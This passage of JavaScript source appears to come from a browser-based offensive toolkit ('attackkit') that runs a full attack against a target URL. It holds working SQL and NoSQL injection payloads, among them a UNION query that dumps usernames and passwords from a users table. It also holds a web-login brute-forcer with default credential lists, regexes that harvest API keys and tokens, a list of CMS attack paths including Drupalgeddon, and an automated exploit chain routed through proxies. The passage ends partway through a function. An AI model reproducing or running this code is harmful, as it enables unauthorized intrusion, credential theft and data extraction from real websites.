      'JWT Token': /eyJ[0-9a-zA-Z\-_]+\.[0-9a-zA-Z\-_]+\.[0-9a-zA-Z\-_]+/g,
      'Private Key': /-----BEGIN (?:RSA|DSA|EC|OPENSSH|PGP) PRIVATE KEY-----/g,
      'Password': /(password|passwd|pwd)\s*[:=]\s*['"][^'"]+['"]/gi,
      'Firebase Config': /apiKey:\s*['"][^'"]+['"]/g,
      'Slack Token': /xox[baprs]-[0-9a-zA-Z-]+/g,
      'Telegram Bot Token': /[0-9]+:AA[0-9A-Za-z\-_]{33}/g,
      'Generic Secret': /(?:secret|token|api[_-]?key)\s*[:=]\s*['"][^'"]+['"]/gi,
      'OpenAI API Key': /sk-[A-Za-z0-9]{48}/g,
      'HuggingFace Token': /hf_[A-Za-z0-9]{40}/g
    };
    for (const [name, regex] of Object.entries(patterns)) {
      regex.lastIndex = 0;
      const matches = String(jsContent ?? '').match(regex);
      if (!matches) continue;
      for (const match of matches) secrets.push({ type: name, value: match.length > 150 ? match.substring(0, 150) + '...' : match, url: String(url || '') });
    }
    return secrets;
  }
  function findSensitiveFiles(jsContent) {
    const sensitivePatterns = ['.env', 'config.js', 'settings.js', '.bak', '.old', '.sql', 'backup', 'database.yml', 'wp-config.php', 'application.properties', '.pem', '.key', 'id_rsa', '.git', 'docker-compose.yml', 'credentials', 'secret'];
    const found = [];
    for (const pat of sensitivePatterns) if (String(jsContent ?? '').toLowerCase().includes(pat)) found.push(pat);
    return found;
  }
  function analyzeComments(jsContent) {
    const comments = [];
    const regex = /\/\*[\s\S]*?\*\/|\/\/[^\n]*/g;
    const matches = String(jsContent ?? '').match(regex);
    if (matches) for (const c of matches) if (/password|secret|key|token|admin|user|db|database|api|endpoint/i.test(c)) {
      const trimmed = c.trim();
      if (trimmed.length < 200) comments.push(trimmed.length > 150 ? trimmed.substring(0, 150) + '...' : trimmed);
    }
    return comments;
  }
  function detectSourceMap(jsFiles) {
    const mapFiles = [];
    for (const js of jsFiles) {
      if (!js || typeof js.content !== 'string') continue;
      const mapMatch = js.content.match(/\/\/# sourceMappingURL=(.*?)(?:\n|$)/);
      if (mapMatch) mapFiles.push({ jsUrl: String(js.url || ''), mapUrl: mapMatch[1] });
    }
    return mapFiles;
  }
  async function jsSourceAnalyzer(jsFiles) {
    const results = { secrets: [], sensitiveFiles: [], comments: [], sourceMaps: [] };
    for (const js of jsFiles) {
      if (!js || typeof js.content !== 'string') continue;
      const secrets = extractSecrets(js.content, js.url);
      results.secrets.push(...secrets);
      const sens = findSensitiveFiles(js.content);
      if (sens.length) results.sensitiveFiles.push({ url: String(js.url || ''), patterns: sens });
      const comments = analyzeComments(js.content);
      results.comments.push(...comments.map(c => ({ url: String(js.url || ''), comment: c })));
    }
    results.sourceMaps = detectSourceMap(jsFiles);
    return results;
  }
  function identifyDatabaseType(headers, errorMessage) {
    const h = normalizeHeaders(headers);
    const server = headerValue(h, 'server').toLowerCase();
    const xpb = headerValue(h, 'x-powered-by').toLowerCase();
    if (server.includes('mysql') || xpb.includes('mysql')) return 'MySQL';
    if (server.includes('postgres') || xpb.includes('postgres')) return 'PostgreSQL';
    if (server.includes('mssql') || xpb.includes('mssql')) return 'MSSQL';
    if (server.includes('oracle') || xpb.includes('oracle')) return 'Oracle';
    if (server.includes('mongo') || xpb.includes('mongodb')) return 'MongoDB';
    if (server.includes('redis')) return 'Redis';
    if (errorMessage && errorMessage.includes('mysql')) return 'MySQL';
    if (errorMessage && errorMessage.includes('postgres')) return 'PostgreSQL';
    if (errorMessage && errorMessage.includes('mssql')) return 'MSSQL';
    if (errorMessage && errorMessage.includes('oracle')) return 'Oracle';
    return 'unknown';
  }
  async function testNoSQLInjection(form) {
    const payloads = ['{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}', '{"$or": [{"username": "admin"}, {"password": {"$gt": ""}}]}', '{"username": {"$regex": ".*"}}', '{"__proto__": {"admin": true}}', '{"username": {"$exists": true}}'];
    const results = [];
    const tasks = payloads.map(payload => async () => {
      try {
        const fieldName = (form.inputs && form.inputs[0]?.name) || 'username';
        const body = JSON.parse(payload);
        const res = await fetchWithRetry(form.action, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ [fieldName]: body }) });
        const text = await res.text();
        if (text.includes('error') || text.includes('success') || text.includes('admin') || text.includes('found')) return { payload, success: true };
      } catch { }
      return null;
    });
    const testResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of testResults) if (result) results.push(result);
    return results;
  }
  async function extractDatabaseInfo(targetUrl, form, dbType) {
    const info = { version: null, databaseName: null, tables: [], columns: {}, sampleData: {} };
    if (dbType !== 'MySQL' && dbType !== 'PostgreSQL' && dbType !== 'MSSQL') return info;
    const payloads = [
      { key: 'version', query: "UNION SELECT @@version, NULL-- -" },
      { key: 'databaseName', query: "UNION SELECT DATABASE(), NULL-- -" },
      { key: 'tables', query: "UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1-- -" },
      { key: 'columns', query: "UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' LIMIT 1-- -" }
    ];
    for (const { key, query } of payloads) {
      try {
        const body = new URLSearchParams();
        (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, `' ${query}`); });
        const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
        const text = await res.text();
        if (key === 'version') {
          const m = text.match(/(\d+\.\d+\.\d+)/);
          if (m) info.version = m[1];
        } else if (key === 'databaseName') {
          const m = text.match(/[A-Za-z0-9_]+/);
          if (m) info.databaseName = m[0];
        } else if (key === 'tables') {
          const names = text.match(/[A-Za-z0-9_]+/g) || [];
          if (names.length) info.tables = names.slice(0, 5);
        } else if (key === 'columns') {
          const names = text.match(/[A-Za-z0-9_]+/g) || [];
          if (names.length) info.columns = { users: names.slice(0, 5) };
        }
      } catch { }
    }
    try {
      const body = new URLSearchParams();
      (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, "' UNION SELECT username, password FROM users LIMIT 1-- -"); });
      const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
      const text = await res.text();
      const creds = text.match(/([A-Za-z0-9_]+)\s*:\s*([A-Za-z0-9_]+)/);
      if (creds) info.sampleData = { username: creds[1], password: creds[2] };
    } catch { }
    return info;
  }
  async function databaseCracker(targetUrl, forms, headers, errors) {
    const dbType = identifyDatabaseType(headers, errors);
    const results = { dbType, sqlInjection: false, noSQL: [], unionDump: null, dbInfo: null };
    const formTasks = forms.map(form => async () => {
      const sqli = await sqliTester(targetUrl, form);
      if (sqli.some(r => r.success)) {
        results.sqlInjection = true;
        if (sqli.some(r => r.type === 'union-based')) results.dbInfo = await extractDatabaseInfo(targetUrl, form, dbType);
      }
      const noSQL = await testNoSQLInjection(form);
      if (noSQL.length) results.noSQL.push({ form: form.id, results: noSQL });
    });
    await limitConcurrency(formTasks, state.settings.maxConcurrentRequests);
    return results;
  }
  async function sshBrute(targetUrl, wordlist = ['root', 'admin', 'password', '123456', 'test']) {
    return { attempted: true, success: false, note: 'SSH brute force not possible from browser; use external tools like hydra.' };
  }
  async function ftpBrute(targetUrl, wordlist = ['anonymous', 'ftp', 'admin', 'password']) {
    return { attempted: true, success: false, note: 'FTP brute force not possible from browser; use external tools.' };
  }
  async function rdpBrute(targetUrl, wordlist = ['administrator', 'admin', 'guest']) {
    return { attempted: true, success: false, note: 'RDP brute force not possible from browser; use external tools.' };
  }
  async function webLoginBrute(form, wordlist = ['admin', 'password', '123456', 'letmein', 'root', 'test', 'user', 'demo', 'qwerty', 'admin123', 'pass123', 'welcome', 'p@ssw0rd', '123456789']) {
    const results = [];
    const usernames = ['admin', 'root', 'test', 'user', 'administrator'];
    const csrfToken = (form.inputs || []).find(i => /csrf|token/i.test(i.name || ''))?.value || '';
    const tasks = [];
    for (const username of usernames) for (const password of wordlist) tasks.push(async () => {
      try {
        const body = new URLSearchParams();
        (form.inputs || []).forEach(i => {
          if (!i.name) return;
          if (i.name.toLowerCase().includes('user')) body.set(i.name, username);
          else if (i.name.toLowerCase().includes('pass')) body.set(i.name, password);
          else if (/csrf|token/i.test(i.name)) body.set(i.name, csrfToken);
          else body.set(i.name, i.value);
        });
        const res = await fetchWithRetry(form.action, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString(), redirect: 'manual' });
        if (res.status === 302 || res.status === 303) return { username, password, success: true };
        else if (res.ok) {
          const text = await res.text();
          if (!text.toLowerCase().includes('login') && !text.toLowerCase().includes('wrong') && !text.toLowerCase().includes('error') && !text.toLowerCase().includes('invalid')) return { username, password, success: true };
        }
      } catch { }
      return null;
    });
    const bruteResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of bruteResults) if (result) results.push(result);
    return results;
  }
  async function serverBruteforce(targetUrl, forms) {
    const results = { ssh: await sshBrute(targetUrl), ftp: await ftpBrute(targetUrl), rdp: await rdpBrute(targetUrl), webLogin: [] };
    const formTasks = forms.map(form => async () => {
      const type = classifyFormType(form);
      if (type === 'login') {
        const attempts = await webLoginBrute(form);
        results.webLogin.push({ form: form.id, action: form.action, attempts });
      }
    });
    await limitConcurrency(formTasks, state.settings.maxConcurrentRequests);
    return results;
  }
  const cveDatabase = {
    'WordPress': [
      { name: 'wp-login brute', type: 'brute', path: '/wp-login.php', method: 'POST', fields: ['log', 'pwd'] },
      { name: 'wp-json user enumeration', type: 'enum', path: '/wp-json/wp/v2/users' },
      { name: 'wp-content directory listing', type: 'check', path: '/wp-content/' },
      { name: 'wp-cron.php DoS', type: 'dos', path: '/wp-cron.php' },
      { name: 'XML-RPC pingback', type: 'check', path: '/xmlrpc.php' }
    ],
    'Joomla': [
      { name: 'com_users SQLi', type: 'sqli', path: '/index.php?option=com_users&view=users' },
      { name: 'administrator login', type: 'brute', path: '/administrator/index.php', fields: ['username', 'passwd'] }
    ],
    'Drupal': [
      { name: 'Drupalgeddon', type: 'rce', path: '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' }
    ],
    'Spring': [
      { name: 'Actuator env', type: 'check', path: '/actuator/env' },
      { name: 'Actuator heapdump', type: 'check', path: '/actuator/heapdump' },
      { name: 'Actuator beans', type: 'check', path: '/actuator/beans' }
    ],
    'Generic': [
      { name: 'Actuator env', type: 'check', path: '/actuator/env' },
      { name: '.git directory', type: 'check', path: '/.git/' },
      { name: 'Server-Status', type: 'check', path: '/server-status' },
      { name: 'Swagger UI', type: 'check', path: '/swagger-ui.html' },
      { name: 'Console', type: 'check', path: '/console' }
    ]
  };
  async function autoAttack(targetUrl, profile) {
    const results = [];
    const cms = (profile.cms && profile.cms.length) ? profile.cms[0] : 'Generic';
    const exploits = cveDatabase[cms] || cveDatabase['Generic'];
    const tasks = exploits.map(exploit => async () => {
      const url = resolveUrl(exploit.path, targetUrl);
      if (!url) return null;
      try {
        if (exploit.type === 'check') {
          const res = await fetchWithRetry(url, { method: 'GET' });
          if (res.ok || res.status === 403) return { name: exploit.name, url, status: res.status, success: true, type: 'information' };
        } else if (exploit.type === 'enum') {
          const res = await fetchWithRetry(url);
          if (res.ok) {
            const data = await res.json();
            if (Array.isArray(data) && data.length > 0) return { name: exploit.name, url, success: true, type: 'enumeration', data: data.slice(0, 5) };
          }
        } else if (exploit.type === 'brute') {
          const creds = [
            { username: 'admin', password: 'admin' },
            { username: 'admin', password: 'password' },
            { username: 'admin', password: '123456' }
          ];
          for (const cred of creds) {
            const body = new URLSearchParams();
            const fields = exploit.fields || ['username', 'password'];
            fields.forEach(f => {
              if (f.includes('log') || f.includes('user')) body.set(f, cred.username);
              else if (f.includes('pwd') || f.includes('pass')) body.set(f, cred.password);
              else body.set(f, '');
            });
            const res = await fetchWithRetry(url, { method: exploit.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString(), redirect: 'manual' });
            if (res.status === 302 || res.status === 303) return { name: `${exploit.name} - ${cred.username}/${cred.password}`, url, success: true, type: 'brute' };
          }
        } else if (exploit.type === 'sqli') {
          const testUrl = url + "'";
          const res = await fetchWithRetry(testUrl);
          const text = await res.text();
          if (text.includes('SQL') || text.includes('mysql') || text.includes('syntax')) return { name: exploit.name, url, success: true, type: 'sqli' };
        }
      } catch { }
      return null;
    });
    const testResults = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of testResults) if (result) results.push(result);
    return results;
  }
  async function wordPressScanner(targetUrl, profile) {
    const results = [];
    try {
      const usersUrl = new URL('/wp-json/wp/v2/users', targetUrl).href;
      const res = await fetchWithRetry(usersUrl);
      if (res.ok) {
        const users = await res.json();
        if (Array.isArray(users) && users.length) results.push({ type: 'user-enumeration', users: users.map(u => u.slug).filter(Boolean), success: true });
      }
    } catch { }
    const pluginPaths = new Set();
    for (const js of (profile.jsFiles || [])) {
      if (!js || typeof js.url !== 'string') continue;
      const match = js.url.match(/\/wp-content\/plugins\/([^\/]+)\//);
      if (match) pluginPaths.add(match[1]);
    }
    for (const ep of (profile.endpoints || [])) {
      if (typeof ep !== 'string') continue;
      const cleanEp = ep.replace(/^SUSPICIOUS: /, '');
      const match = cleanEp.match(/\/wp-content\/plugins\/([^\/]+)\//);
      if (match) pluginPaths.add(match[1]);
    }
    if (pluginPaths.size > 0) results.push({ type: 'plugin-enumeration', plugins: [...pluginPaths], success: true });
    try {
      const xmlrpcUrl = new URL('/xmlrpc.php', targetUrl).href;
      const res = await fetchWithRetry(xmlrpcUrl, { method: 'POST', headers: { 'Content-Type': 'text/xml' }, body: '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' });
      if (res.ok) {
        const text = await res.text();
        if (text.includes('system.listMethods')) results.push({ type: 'xmlrpc-available', success: true });
      }
    } catch { }
    try {
      const cronUrl = new URL('/wp-cron.php', targetUrl).href;
      const res = await fetchWithRetry(cronUrl);
      if (res.ok) results.push({ type: 'wp-cron-accessible', success: true });
    } catch { }
    try {
      const loginUrl = new URL('/wp-login.php', targetUrl).href;
      const res = await fetchWithRetry(loginUrl);
      if (res.ok) results.push({ type: 'wp-login-accessible', success: true });
    } catch { }
    return results;
  }
  async function postExploitation(targetUrl, profile, exploitResults) {
    return { note: 'No further post-exploitation actions performed.' };
  }
  function renderProfile(profile) {
    const out = [];
    out.push(line('╔══════════════════════════════════════════╗', 'accent'));
    out.push(line('║        Target Profile Report            ║', 'accent'));
    out.push(line('╚══════════════════════════════════════════╝', 'accent'));
    out.push(spacer());
    out.push(line('Target', 'accent'));
    out.push(line(`  ├── URL: ${profile.target?.normalized || 'N/A'}`));
    out.push(line(`  ├── Domain: ${profile.target?.domain || 'N/A'}`));
    out.push(line(`  ├── Status: ${profile.target?.status || 'N/A'}`));
    out.push(line(`  └── Response URL (may be proxy): ${profile.target?.responseUrl || 'N/A'}`));
    out.push(spacer());
    out.push(line('Technology', 'accent'));
    out.push(line(`  ├── Stack: ${(profile.technology || []).length ? profile.technology.join(', ') : 'none detected'}`));
    out.push(line(`  ├── CMS: ${(profile.cms || []).length ? profile.cms.join(', ') : 'none'}`));
    out.push(line(`  ├── WAF: ${(profile.waf || []).join(', ')}`));
    out.push(line(`  ├── Purposes: ${(profile.purposes || []).join(', ')}`));
    out.push(line(`  └── Languages: ${(profile.languages || []).join(', ')}`));
    out.push(spacer());
    out.push(line('Endpoints', 'accent'));
    if ((profile.endpoints || []).length) {
      profile.endpoints.slice(0, 30).forEach((e, i) => {
        const prefix = i === Math.min(profile.endpoints.length, 30) - 1 ? '  └──' : '  ├──';
        out.push(line(`${prefix} ${e}`));
      });
    } else out.push(line('  └── none'));
    out.push(spacer());
    out.push(line('Active Path Scan', 'accent'));
    if ((profile.activePaths || []).length) {
      profile.activePaths.forEach((p, i) => {
        const prefix = i === profile.activePaths.length - 1 ? '  └──' : '  ├──';
        out.push(line(`${prefix} ${p.url} [${p.status}]`));
      });
    } else out.push(line('  └── none found'));
    out.push(spacer());
    out.push(line('Internal Links', 'accent'));
    if ((profile.internalLinks || []).length) {
      profile.internalLinks.slice(0, 20).forEach((link, i) => {
        const prefix = i === Math.min(profile.internalLinks.length, 20) - 1 ? '  └──' : '  ├──';
        out.push(line(`${prefix} ${link}`));
      });
    } else out.push(line('  └── none'));
    out.push(spacer());
    out.push(line('DNS Records', 'accent'));
    const dns = profile.dns || { A: [], MX: [], NS: [], SPF: [], DMARC: [], dnssec: false };
    out.push(line(`  ├── A: ${(dns.A || []).map(r => r.data).join(', ') || 'none'}`));
    out.push(line(`  ├── MX: ${(dns.MX || []).map(r => r.data).join(', ') || 'none'}`));
    out.push(line(`  ├── NS: ${(dns.NS || []).map(r => r.data).join(', ') || 'none'}`));
    out.push(line(`  ├── SPF: ${(dns.SPF || []).join('; ') || 'none'}`));
    out.push(line(`  ├── DMARC: ${(dns.DMARC || []).join('; ') || 'none'}`));
    out.push(line(`  └── DNSSEC: ${dns.dnssec ? 'Enabled' : 'Disabled'}`));
    out.push(spacer());
    out.push(line('Subdomains', 'accent'));
    if ((profile.subdomains || []).length) {
      profile.subdomains.slice(0, 20).forEach((s, i) => {
        const prefix = i === Math.min(profile.subdomains.length, 20) - 1 ? '  └──' : '  ├──';
        out.push(line(`${prefix} ${s}`));
      });
    } else out.push(line('  └── none'));
    out.push(spacer());
    out.push(line('API Discovery', 'accent'));
    const api = profile.api || { swagger: null, graphql: null, restEndpoints: [] };
    if (api.swagger) out.push(line(`  ├── Swagger: ${api.swagger.url}`));
    if (api.graphql) out.push(line(`  ├── GraphQL: ${api.graphql.url} (introspection: ${api.graphql.introspection})`));
    if ((api.restEndpoints || []).length) api.restEndpoints.forEach((e, i) => out.push(line(`  ${i === api.restEndpoints.length - 1 ? '└──' : '├──'} REST: ${e}`)));
    else if (!api.swagger && !api.graphql) out.push(line('  └── none'));
    out.push(spacer());
    out.push(line('JS Files', 'accent'));
    if ((profile.jsFiles || []).length) {
      profile.jsFiles.forEach((f, i) => {
        const prefix = i === profile.jsFiles.length - 1 ? '  └──' : '  ├──';
        out.push(line(`${prefix} ${f.url} (${f.fetched ? 'fetched' : 'failed'})`));
      });
    } else out.push(line('  └── none'));
    out.push(spacer());
    out.push(line('Source Maps', 'accent'));
    if ((profile.cssMaps || []).length) {
      profile.cssMaps.forEach((m, i) => {
        const prefix = i === profile.cssMaps.length - 1 ? '  └──' : '  ├──';
        out.push(line(`${prefix} ${m}`));
      });
    } else out.push(line('  └── none found'));
    return out;
  }
  function renderExploit(exploitData) {
    const out = [];
    out.push(line('╔══════════════════════════════════════════╗', 'accent'));
    out.push(line('║        Exploitation Report              ║', 'accent'));
    out.push(line('╚══════════════════════════════════════════╝', 'accent'));
    out.push(spacer());
    out.push(line(`Forms found: ${(exploitData.forms || []).length}`));
    for (const form of (exploitData.forms || [])) {
      out.push(line(`Form ID: ${form.id}`, 'accent'));
      out.push(line(`  ├── Action: ${form.action}`));
      out.push(line(`  ├── Method: ${form.method}`));
      out.push(line(`  ├── Type: ${form.type}`));
      out.push(line('  ├── XSS Results:'));
      if ((form.xss || []).length) {
        form.xss.forEach((x, i) => {
          const prefix = i === form.xss.length - 1 ? '  │   └──' : '  │   ├──';
          if (x.type === 'dom') out.push(line(`${prefix} DOM-based XSS (${x.findings ? x.findings.length : 0} sinks)`));
          else out.push(line(`${prefix} ${x.type}: ${x.payload}`));
        });
      } else out.push(line('  │   └── none'));
      out.push(line('  ├── SQLi Results:'));
      if ((form.sqli || []).length) {
        form.sqli.forEach((s, i) => {
          const prefix = i === form.sqli.length - 1 ? '  │   └──' : '  │   ├──';
          out.push(line(`${prefix} ${s.type}: ${s.payload}`));
        });
      } else out.push(line('  │   └── none'));
      out.push(line('  ├── LFI Results:'));
      if ((form.lfi || []).length) {
        form.lfi.forEach((l, i) => {
          const prefix = i === form.lfi.length - 1 ? '  │   └──' : '  │   ├──';
          out.push(line(`${prefix} ${l.type}: ${l.payload}`));
        });
      } else out.push(line('  │   └── none'));
      out.push(line('  ├── Open Redirect:'));
      if (form.openRedirect && form.openRedirect.length) {
        form.openRedirect.forEach((o, i) => {
          const prefix = i === form.openRedirect.length - 1 ? '  │   └──' : '  │   ├──';
          out.push(line(`${prefix} ${o.payload} -> ${o.redirectUrl}`));
        });
      } else out.push(line('  │   └── none'));
      out.push(line('  ├── SSRF:'));
      if (form.ssrf && form.ssrf.length) {
        form.ssrf.forEach((s, i) => {
          const prefix = i === form.ssrf.length - 1 ? '  │   └──' : '  │   ├──';
          out.push(line(`${prefix} ${s.url}`));
        });
      } else out.push(line('  │   └── none'));
      out.push(line('  ├── Command Injection:'));
      if (form.commandInjection && form.commandInjection.length) {
        form.commandInjection.forEach((c, i) => {
          const prefix = i === form.commandInjection.length - 1 ? '  │   └──' : '  │   ├──';
          out.push(line(`${prefix} ${c.payload}`));
        });
      } else out.push(line('  │   └── none'));
      out.push(line('  ├── XXE:'));
      if (form.xxe && form.xxe.success) out.push(line(`  │   └── success: ${form.xxe.evidence}`));
      else out.push(line('  │   └── none'));
      out.push(line('  ├── CRLF Injection:'));
      if (form.crlf && form.crlf.length) {
        form.crlf.forEach((c, i) => {
          const prefix = i === form.crlf.length - 1 ? '  │   └──' : '  │   ├──';
          out.push(line(`${prefix} ${c.payload}`));
        });
      } else out.push(line('  │   └── none'));
      out.push(line('  ├── Host Header Injection:'));
      if (form.hostHeader && form.hostHeader.length) {
        form.hostHeader.forEach((h, i) => {
          const prefix = i === form.hostHeader.length - 1 ? '  │   └──' : '  │   ├──';
          out.push(line(`${prefix} ${h.host}`));
        });
      } else out.push(line('  │   └── none'));
      out.push(line('  └── CORS Misconfig:'));
      if (form.cors && form.cors.length) {
        form.cors.forEach((c, i) => {
          const prefix = i === form.cors.length - 1 ? '      └──' : '      ├──';
          out.push(line(`${prefix} ${c.origin} (${c.allowOrigin})`));
        });
      } else out.push(line('      └── none'));
    }
    out.push(line(`IDOR Vulnerabilities: ${(exploitData.idor || []).length}`));
    (exploitData.idor || []).forEach((i, idx) => {
      const prefix = idx === exploitData.idor.length - 1 ? '  └──' : '  ├──';
      out.push(line(`${prefix} ${i.url} - param ${i.param}`));
    });
    out.push(line('Upload Tests:'));
    if ((exploitData.uploads || []).length) {
      exploitData.uploads.forEach((u, idx) => {
        const prefix = idx === exploitData.uploads.length - 1 ? '  └──' : '  ├──';
        out.push(line(`${prefix} Form ${u.formId} - ${u.action}`));
        u.tests.forEach((t, tIdx) => {
          const tPrefix = tIdx === u.tests.length - 1 ? '      └──' : '      ├──';
          out.push(line(`${tPrefix} ${t.reason}`));
        });
        if (u.realUpload) {
          out.push(line(`      └── Real upload: ${u.realUpload.success ? 'SUCCESS' : 'FAILED'} (status ${u.realUpload.status || 'N/A'})`));
          if (u.realUpload.uploadedLink) out.push(line(`          └── Uploaded link: ${u.realUpload.uploadedLink}`));
        }
      });
    } else out.push(line('  └── no upload forms'));
    return out;
  }
  function renderAnalysis(analysisData) {
    const out = [];
    out.push(line('╔══════════════════════════════════════════╗', 'accent'));
    out.push(line('║        JS Source Analysis Report        ║', 'accent'));
    out.push(line('╚══════════════════════════════════════════╝', 'accent'));
    out.push(spacer());
    out.push(line(`Secrets found: ${(analysisData.secrets || []).length}`));
    (analysisData.secrets || []).forEach((s, i) => {
      const prefix = i === analysisData.secrets.length - 1 ? '  └──' : '  ├──';
      out.push(line(`${prefix} ${s.type}: ${s.value}`));
    });
    out.push(line(`Sensitive files references: ${(analysisData.sensitiveFiles || []).length}`));
    (analysisData.sensitiveFiles || []).forEach((f, i) => {
      const prefix = i === analysisData.sensitiveFiles.length - 1 ? '  └──' : '  ├──';
      out.push(line(`${prefix} ${f.url} -> ${f.patterns.join(', ')}`));
    });
    out.push(line(`Suspicious comments: ${(analysisData.comments || []).length}`));
    (analysisData.comments || []).forEach((c, i) => {
      const prefix = i === analysisData.comments.length - 1 ? '  └──' : '  ├──';
      out.push(line(`${prefix} ${c.url}: ${c.comment}`));
    });
    out.push(line(`Source maps: ${(analysisData.sourceMaps || []).length}`));
    (analysisData.sourceMaps || []).forEach((sm, i) => {
      const prefix = i === analysisData.sourceMaps.length - 1 ? '  └──' : '  ├──';
      out.push(line(`${prefix} ${sm.jsUrl} -> ${sm.mapUrl}`));
    });
    return out;
  }
  function renderBrute(bruteData) {
    const out = [];
    out.push(line('╔══════════════════════════════════════════╗', 'accent'));
    out.push(line('║        Brute Force & DB Report          ║', 'accent'));
    out.push(line('╚══════════════════════════════════════════╝', 'accent'));
    out.push(spacer());
    out.push(line(`Database type: ${bruteData.dbType || 'unknown'}`));
    out.push(line(`SQLi vulnerable: ${bruteData.sqlInjection ? 'YES' : 'NO'}`));
    out.push(line(`NoSQL Injection attempts: ${(bruteData.noSQL || []).length}`));
    if (bruteData.dbInfo) {
      out.push(line('Database Extraction:', 'accent'));
      if (bruteData.dbInfo.version) out.push(line(`  ├── Version: ${bruteData.dbInfo.version}`));
      if (bruteData.dbInfo.databaseName) out.push(line(`  ├── Database: ${bruteData.dbInfo.databaseName}`));
      if ((bruteData.dbInfo.tables || []).length) out.push(line(`  ├── Tables: ${bruteData.dbInfo.tables.join(', ')}`));
      if (bruteData.dbInfo.sampleData && Object.keys(bruteData.dbInfo.sampleData).length) out.push(line(`  └── Sample data: ${JSON.stringify(bruteData.dbInfo.sampleData)}`));
    }
    out.push(line('Server brute force:'));
    out.push(line(`  ├── SSH: ${bruteData.ssh?.note || 'N/A'}`));
    out.push(line(`  ├── FTP: ${bruteData.ftp?.note || 'N/A'}`));
    out.push(line(`  └── RDP: ${bruteData.rdp?.note || 'N/A'}`));
    if ((bruteData.webLogin || []).length) {
      out.push(line('Web login attempts:'));
      bruteData.webLogin.forEach((w, i) => {
        const prefix = i === bruteData.webLogin.length - 1 ? '  └──' : '  ├──';
        out.push(line(`${prefix} Form ${w.form} -> ${w.action}`));
        (w.attempts || []).forEach((a, j) => {
          const aPrefix = j === w.attempts.length - 1 ? '      └──' : '      ├──';
          out.push(line(`${aPrefix} ${a.username}:${a.password} - ${a.success ? 'SUCCESS' : 'fail'}`));
        });
      });
    }
    return out;
  }
  function renderAutoExploit(autoResults) {
    const out = [];
    out.push(line('╔══════════════════════════════════════════╗', 'accent'));
    out.push(line('║        Auto Exploit Chain Report        ║', 'accent'));
    out.push(line('╚══════════════════════════════════════════╝', 'accent'));
    out.push(spacer());
    if ((autoResults || []).length) {
      autoResults.forEach((r, i) => {
        const prefix = i === autoResults.length - 1 ? '  └──' : '  ├──';
        out.push(line(`${prefix} ${r.name} - ${r.url} (${r.success ? 'SUCCESS' : 'FAIL'})`));
        if (r.type === 'enumeration' && r.data) {
          r.data.slice(0, 3).forEach((item, j) => {
            const dPrefix = j === Math.min(r.data.length, 3) - 1 ? '      └──' : '      ├──';
            out.push(line(`${dPrefix} ${JSON.stringify(item)}`));
          });
        }
      });
    } else out.push(line('  └── No successful exploits found.'));
    return out;
  }
  function renderWordPress(wpResults) {
    const out = [];
    out.push(line('╔══════════════════════════════════════════╗', 'accent'));
    out.push(line('║        WordPress Specific Findings      ║', 'accent'));
    out.push(line('╚══════════════════════════════════════════╝', 'accent'));
    out.push(spacer());
    if ((wpResults || []).length) {
      wpResults.forEach((r, i) => {
        const prefix = i === wpResults.length - 1 ? '  └──' : '  ├──';
        if (r.type === 'user-enumeration') out.push(line(`${prefix} User enumeration: ${(r.users || []).join(', ')}`));
        else if (r.type === 'plugin-enumeration') out.push(line(`${prefix} Plugins: ${(r.plugins || []).join(', ')}`));
        else out.push(line(`${prefix} ${r.type}: ${r.success ? 'found' : 'not found'}`));
      });
    } else out.push(line('  └── No WordPress-specific findings.'));
    return out;
  }
  async function runPhase(name, fn) {
    const start = Date.now();
    state.api?.append?.([line(`⏳ Starting Phase: ${name}`, 'accent')]);
    const results = await fn();
    const duration = Date.now() - start;
    state.runtime.stats.phaseTimings[name] = duration;
    state.api?.append?.([line(`✅ Phase ${name} completed in ${duration}ms`, 'success')]);
    return { results, duration };
  }
  async function cmdAttack({ args }) {
    if (!args[1]) return fail('Usage: attackkit attack <url>');
    const url = args[1];
    try {
      await prepareProxyList();
    } catch (e) {
      return fail(`Proxy initialization failed: ${e.message}`);
    }
    state.api?.append?.([line(`◈ Starting full attack on ${url} …`, 'accent')]);
    const totalStart = Date.now();
    const allReports = [];
    try {
      const phase1 = await runPhase('Profiling', async () => await buildProfile(url));
      const profile = phase1.results;
      allReports.push(...renderProfile(profile));
      allReports.push(spacer());
      const [phase2, phase3, phase4, wpPhase] = await Promise.all([
        runPhase('Web Exploitation', async () => {
          const html = profile.html;
          const jsFiles = profile.jsFiles || [];
          const forms = profile.forms || [];
          const exploitData = { forms: [], idor: [], uploads: [] };
          const formTasks = forms.map(form => async () => {
            const type = classifyFormType(form);
            const xss = await xssTester(url, form, jsFiles);
            const sqli = await sqliTester(url, form);
            const lfi = await lfiTester(url, form);
            const openRedirect = await openRedirectTester(url, form);
            const ssrf = await ssrfTester(url, form);
            const commandInjection = await commandInjectionTester(url, form);
            const xxe = await xxeTester(url, form);
            const crlf = await crlfInjectionTester(url, form);
            const hostHeader = await hostHeaderInjectionTester(url);
            const cors = await corsMisconfigTester(url);
            return { id: form.id, action: form.action, method: form.method, type, xss, sqli, lfi, openRedirect, ssrf, commandInjection, xxe, crlf, hostHeader, cors };
          });
          const formResults = await limitConcurrency(formTasks, state.settings.maxConcurrentRequests);
          exploitData.forms = formResults.filter(r => r !== null);
          exploitData.idor = await idorTester(url, forms, html);
          exploitData.uploads = await uploadTesterWithReal(url, forms);
          return exploitData;
        }),
        runPhase('Server Cracking', async () => {
